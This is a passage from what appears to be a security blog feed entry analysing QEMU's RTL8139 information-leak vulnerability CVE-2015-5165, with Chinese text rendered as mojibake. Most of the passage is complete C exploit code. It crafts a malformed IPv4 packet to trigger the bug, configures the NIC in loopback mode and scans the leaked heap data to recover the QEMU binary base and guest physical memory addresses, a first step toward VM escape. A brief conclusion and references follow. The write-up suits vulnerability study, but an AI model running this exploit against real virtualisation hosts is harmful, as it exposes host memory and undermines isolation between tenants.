checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">// TCP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_COUNT 0x2000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_SIZE_MASK ~7ull</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 ç½‘å¡å¯„å­˜å™¨åç§»åœ°å€</span></span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers </span><br><span class="line">&#123;</span><br><span class="line">    TxAddr0      = <span class="number">0x20</span>,    <span class="comment">// Tx descriptors address</span></span><br><span class="line">    ChipCmd      = <span class="number">0x37</span>,</span><br><span class="line">    TxConfig     = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig     = <span class="number">0x44</span>,</span><br><span class="line">    TxPoll       = <span class="number">0xD9</span>,    <span class="comment">// tell chip to check Tx descriptors for work</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>,    <span class="comment">// C+ Command register (C+ mode only)</span></span><br><span class="line">    <span class="comment">// è™½ç„¶åå­—å†™çš„ RxRingAddr, ä½†å®é™…ä¸Šæ˜¯ Rx descriptor çš„åœ°å€</span></span><br><span class="line">    RxRingAddrLO = <span class="number">0xE4</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">    RxRingAddrHI = <span class="number">0xE8</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_tx_config_bits </span><br><span class="line">&#123;</span><br><span class="line">    TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">// enable loopback test mode</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_rx_mode_bits </span><br><span class="line">&#123;</span><br><span class="line">    AcceptErr       = <span class="number">0x20</span>,</span><br><span class="line">    AcceptRunt      = <span class="number">0x10</span>,</span><br><span class="line">    AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">    AcceptMulticast = <span class="number">0x04</span>,</span><br><span class="line">    AcceptMyPhys    = <span class="number">0x02</span>,</span><br><span class="line">    AcceptAllPhys   = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_CplusCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RT8139_ChipCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CmdReset    = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb    = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb    = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty  = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL8139_TxPollBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlus = <span class="number">0x40</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx descriptor</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx ring</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_ring</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span>* <span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">void</span>* buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> rtl8139_packet[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Ethernet Frame Header æ•°æ®</span></span><br><span class="line">    <span class="comment">// DST MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// SRC MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// Length / Type: IPv4</span></span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Ethernet Frame Payload æ•°æ®, å³ IPv4 æ•°æ®åŒ…</span></span><br><span class="line">    <span class="comment">// Version &amp; IHL(Internet Header Length)</span></span><br><span class="line">    (<span class="number">0x04</span> &lt;&lt; <span class="number">4</span>) | <span class="number">0x05</span>,    <span class="comment">// 0x05 * 4 = 20 bytes</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Total Length = 0x13 = 19 bytes</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x13</span>,     <span class="comment">// 19 - 20 = -1 = 0xFFFF, trigger vulnerability</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Identification</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>,     <span class="comment">// Flags &amp; Fragment Offset</span></span><br><span class="line">    <span class="number">0x40</span>,           <span class="comment">// TTL</span></span><br><span class="line">    <span class="number">0x06</span>,           <span class="comment">// Protocol: TCP</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Header checksum</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Source IP: 127.0.0.1</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Destination IP: 127.0.0.1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// IP Packet Payload æ•°æ®, å³ TCP æ•°æ®åŒ…</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Source Port</span></span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0xef</span>,     <span class="comment">// Destination Port</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Sequence Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Acknowledgement Number</span></span><br><span class="line">    <span class="number">0x50</span>,           <span class="comment">// 01010000, Header Length = 5 * 4 = 20</span></span><br><span class="line">    <span class="number">0x10</span>,           <span class="comment">// 00010000, ACK</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Window Size</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// TCP checksum</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>      <span class="comment">// Urgent Pointer</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_pfn(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = <span class="number">-1</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/proc/self/pagemap"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">        <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">        &#123;</span><br><span class="line">            pfn &amp;= PFN_PFN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = get_physical_pfn(addr);</span><br><span class="line">    <span class="keyword">return</span> pfn * PAGE_SIZE + (<span class="keyword">uint64_t</span>)addr % PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(rtl8139_ring* ring, rtl8139_desc* desc, <span class="keyword">size_t</span> nb)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> buffer_size = RTL8139_BUFFER_SIZE + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;desc[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(desc[i]));</span><br><span class="line">        ring[i].desc = &amp;desc[i];</span><br><span class="line">        </span><br><span class="line">        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);</span><br><span class="line">        <span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, buffer_size);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// descriptor owned by NIC å‡†å¤‡æ¥æ”¶æ•°æ®</span></span><br><span class="line">        ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line">        <span class="keyword">if</span> (i == nb - <span class="number">1</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            ring[i].desc-&gt;dw0 |= CP_RX_EOR; <span class="comment">// End of Ring</span></span><br><span class="line">        &#125;</span><br><span class="line">        ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">        ring[i].desc-&gt;dw0 |= buffer_size;   <span class="comment">// buffer_size</span></span><br><span class="line">        ring[i].desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Rx descriptors address</span></span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + RxRingAddrLO);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + RxRingAddrHI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_tx</span><span class="params">(rtl8139_desc* desc, <span class="keyword">void</span>* buffer)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(rtl8139_desc));</span><br><span class="line">    desc-&gt;dw0 |= CP_TX_OWN |    <span class="comment">// descriptor owned by NIC å‡†å¤‡å‘é€æ•°æ®</span></span><br><span class="line">                 CP_TX_EOR |</span><br><span class="line">                 CP_TX_LS |</span><br><span class="line">                 CP_TX_LGSEN |</span><br><span class="line">                 CP_TX_IPCS |</span><br><span class="line">                 CP_TX_TCPCS;</span><br><span class="line">    desc-&gt;dw0 += RTL8139_BUFFER_SIZE;</span><br><span class="line">    desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(buffer);</span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + TxAddr0);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + TxAddr0 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_card_config</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// è§¦å‘æ¼æ´éœ€è¦è®¾ç½®çš„ä¸€äº›å‚æ•°</span></span><br><span class="line">    outl(TxLoopBack, RTL8139_PORT + TxConfig);</span><br><span class="line">    outl(AcceptMyPhys, RTL8139_PORT + RxConfig);</span><br><span class="line">    outw(CPlusRxEnb | CPlusTxEnb, RTL8139_PORT + CpCmd);</span><br><span class="line">    outb(CmdRxEnb | CmdTxEnb, RTL8139_PORT + ChipCmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_packet_send</span><span class="params">(<span class="keyword">void</span>* buffer, <span class="keyword">void</span>* packet, <span class="keyword">size_t</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= RTL8139_BUFFER_SIZE) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, packet, len);</span><br><span class="line">        outb(CPlus, RTL8139_PORT + TxPoll);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxd</span><span class="params">(<span class="keyword">uint8_t</span>* ptr, <span class="keyword">size_t</span> size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; size; ++i, ++j) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n0x%08x: "</span>, ptr + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x "</span>, ptr[i]);</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">7</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"- "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> scan_leaked_chunks(rtl8139_ring* ring, <span class="keyword">size_t</span> ring_count,</span><br><span class="line">                          <span class="keyword">size_t</span> chunk_size, <span class="keyword">void</span>** chunks, <span class="keyword">size_t</span> chunk_count) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; ring_count; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Ethernet Frame Header: 14 +</span></span><br><span class="line">        <span class="comment">// IP Header: 20 +</span></span><br><span class="line">        <span class="comment">// TCP Header: 20 = 54</span></span><br><span class="line">        <span class="keyword">uint8_t</span>* ptr = (<span class="keyword">uint8_t</span>*)ring[i].buffer + <span class="number">56</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span>* end = (<span class="keyword">uint8_t</span>*)ring[i].buffer + RTL8139_BUFFER_SIZE / <span class="number">4</span> * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> (ptr &lt; end) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> size = *(<span class="keyword">uint64_t</span>*)ptr &amp; CHUNK_SIZE_MASK;</span><br><span class="line">            <span class="keyword">if</span> (size == chunk_size) </span><br><span class="line">            &#123;</span><br><span class="line">                chunks[count++] = (<span class="keyword">void</span>*)(ptr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            ptr += <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span> (count &gt; chunk_count) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> leak_module_base_addr(<span class="keyword">void</span>** chunks, <span class="keyword">size_t</span> count) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> property_get_bool_offset = <span class="number">0x377F66</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> mask = <span class="number">0x00000FFF</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; count; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span>* ptr = (<span class="keyword">uint64_t</span>*)chunks[i] + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> ((*ptr &amp; mask) == (property_get_bool_offset &amp; mask)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"property_get_bool: 0x%"</span> PRIx64 <span class="string">"\n"</span>, *ptr);</span><br><span class="line">            <span class="keyword">return</span> *ptr - property_get_bool_offset;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> leak_physical_memory_addr(rtl8139_ring* ring, <span class="keyword">size_t</span> ring_count) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> mask = <span class="number">0xffff000000</span>ull;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="built_in">array</span>[<span class="number">0x10000</span>];</span><br><span class="line">    <span class="keyword">size_t</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">array</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="built_in">array</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; ring_count; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span>* ptr = (<span class="keyword">uint8_t</span>*)ring[i].buffer + <span class="number">56</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span>* end = (<span class="keyword">uint8_t</span>*)ring[i].buffer + RTL8139_BUFFER_SIZE / <span class="number">4</span> * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> (ptr &lt; end - <span class="number">8</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> value = *(<span class="keyword">uint64_t</span>*)ptr;</span><br><span class="line">            <span class="keyword">if</span> (((value &gt;&gt; <span class="number">40</span>) &amp; <span class="number">0xff</span>) == <span class="number">0x7f</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                value = (value &amp; mask) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">                <span class="built_in">array</span>[value]++;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">array</span>[value] &gt; <span class="built_in">array</span>[index]) </span><br><span class="line">                &#123;</span><br><span class="line">                    index = value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ptr += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint64_t</span> memory_size = <span class="number">0x80000000</span>;</span><br><span class="line">    <span class="keyword">return</span> (((<span class="keyword">uint64_t</span>)index | <span class="number">0x7f0000</span>) &lt;&lt; <span class="number">24</span>) - memory_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 44 * RTL8139_BUFFER_SIZE = 44 * 1514 = 66616</span></span><br><span class="line">    <span class="comment">// å¯ä»¥æ”¶å®Œ 65535 å­—èŠ‚æ•°æ®</span></span><br><span class="line">    <span class="keyword">size_t</span> rtl8139_rx_nb = <span class="number">44</span>;</span><br><span class="line">    rtl8139_ring* rtl8139_rx_ring = (rtl8139_ring*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_ring));</span><br><span class="line">    rtl8139_desc* rtl8139_rx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    rtl8139_desc* rtl8139_tx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    <span class="keyword">void</span>* rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// change I/O privilege level</span></span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// initialize Rx ring, Rx descriptor, Tx descriptor</span></span><br><span class="line">    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);</span><br><span class="line">    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);</span><br><span class="line">    rtl8139_card_config();</span><br><span class="line">    rtl8139_packet_send(rtl8139_tx_buffer, rtl8139_packet, </span><br><span class="line">                        <span class="keyword">sizeof</span>(rtl8139_packet));</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// print leaked data</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; rtl8139_rx_nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// RTL8139_BUFFER_SIZE ä¹‹å 4 å­—èŠ‚æ•°æ®ä¸º Checksum</span></span><br><span class="line">        <span class="comment">// ä¸æ‰“å°ä¹Ÿæ— æ‰€è°“äº†</span></span><br><span class="line">        xxd((<span class="keyword">uint8_t</span>*)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// exploit</span></span><br><span class="line">    <span class="keyword">void</span>* chunks[CHUNK_COUNT] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">size_t</span> chunk_count = scan_leaked_chunks(rtl8139_rx_ring, rtl8139_rx_nb, </span><br><span class="line">                                            <span class="number">0x60</span>, chunks, CHUNK_COUNT);</span><br><span class="line">    <span class="keyword">uint64_t</span> module_addr = leak_module_base_addr(chunks, chunk_count);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"qemu-system-x86_64: 0x%"</span> PRIx64 <span class="string">"\n"</span>, module_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> physical_memory_addr = leak_physical_memory_addr(</span><br><span class="line">        rtl8139_rx_ring, rtl8139_rx_nb);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"physical memory address: 0x%"</span> PRIx64 <span class="string">"\n"</span>, physical_memory_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> free heap blocks</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploit æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/uploads/202006/cve-2015-5165-exploit.png" alt="QEMU æ¼æ´ CVE-2015-5165 Exploit"></p><h2 id="0x05-åˆ†æå°ç»“"><a href="#0x05-åˆ†æå°ç»“" class="headerlink" title="0x05. åˆ†æå°ç»“"></a>0x05. åˆ†æå°ç»“</h2><p>ç¬¬ä¸€æ¬¡åˆ†æ QEMU çš„æ¼æ´ï¼Œæ•´ä½“æ„Ÿè§‰è¿˜æŒºæœ‰æ„æ€çš„ï¼ŒCVE-2015-5165 è¿™ä¸ªæ¼æ´æœ¬èº«ç®€å•æ˜“æ‡‚ï¼Œå¦‚æœäº†è§£ç½‘å¡åŸºæœ¬å·¥ä½œåŸç†çš„è¯ï¼ŒExploit ç¼–å†™ä¹Ÿä¸æ˜¯å¾ˆéš¾ã€‚</p><h2 id="0x06-å‚è€ƒæ–‡çŒ®"><a href="#0x06-å‚è€ƒæ–‡çŒ®" class="headerlink" title="0x06. å‚è€ƒæ–‡çŒ®"></a>0x06. å‚è€ƒæ–‡çŒ®</h2><p>[1] <a href="http://www.phrack.org/papers/vm-escape-qemu-case-study.html" target="_blank" rel="noopener">http://www.phrack.org/papers/vm-escape-qemu-case-study.html</a></p><p>[2] <a href="http://patchwork.ozlabs.org/project/qemu-devel/patch/20161228200433.24244-1-cov@codeaurora.org/" target="_blank" rel="noopener">QEMU commands-posix.c patch - &lt;sys/sysmacros.h&gt;</a></p><p>[3] <a href="https://dangokyo.me/2018/03/02/qemu-escape-part-1-environment-set-up/" target="_blank" rel="noopener">https://dangokyo.me/2018/03/02/qemu-escape-part-1-environment-set-up/</a></p><p>[4] <a href="https://www.realvnc.com/en/connect/download/viewer/" target="_blank" rel="noopener">https://www.realvnc.com/en/connect/download/viewer/</a></p><p>[5] <a href="https://shanetully.com/2014/12/translating-virtual-addresses-to-physcial-addresses-in-user-space/" target="_blank" rel="noopener">https://shanetully.com/2014/12/translating-virtual-addresses-to-physcial-addresses-in-user-space/</a></p><p>[6] <a href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/vm/pagemap.txt</a></p><p>[7] TCP/IP Illustrated, Volum 1, The protocols, Second Edition, Kevin R. Fall, W. Richard Stevens</p><p>[8] <a href="http://realtek.info/pdf/rtl8139cp.pdf" target="_blank" rel="noopener">http://realtek.info/pdf/rtl8139cp.pdf</a></p><p>[9] <a href="https://www.anquanke.com/post/id/197637" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197637</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‚è€ƒ Phrack æ–‡ç«  &lt;strong&gt;&lt;em&gt;VM escape - QEMU Case Study&lt;/em&gt;&lt;/strong&gt; [1] å¯¹ QEMU ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2015-5165 å’Œå †æº¢å‡ºæ¼æ´ CVE-2015-7504 è¿›è¡Œè°ƒè¯•åˆ†æå¹¶ç¼–å†™ Exploit ä»£ç ï¼Œæœ¬æ–‡ä¸»è¦åˆ†æå…¶ä¸­çš„ RTL8139 ç½‘å¡ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2015-5165ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="http://programlife.net/categories/Virtualization/"/>
    
      <category term="QEMU" scheme="http://programlife.net/categories/Virtualization/QEMU/"/>
    
    
      <category term="QEMU" scheme="http://programlife.net/tags/QEMU/"/>
    
      <category term="RTL8139" scheme="http://programlife.net/tags/RTL8139/"/>
    
      <category term="CVE-2015-5165" scheme="http://programlife.net/tags/CVE-2015-5165/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to Hypercall</title>
    <link href="http://programlife.net/2020/05/20/introduction-to-hypercall/"/>
    <id>http://programlife.net/2020/05/20/introduction-to-hypercall/</id>
    <published>2020-05-20T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
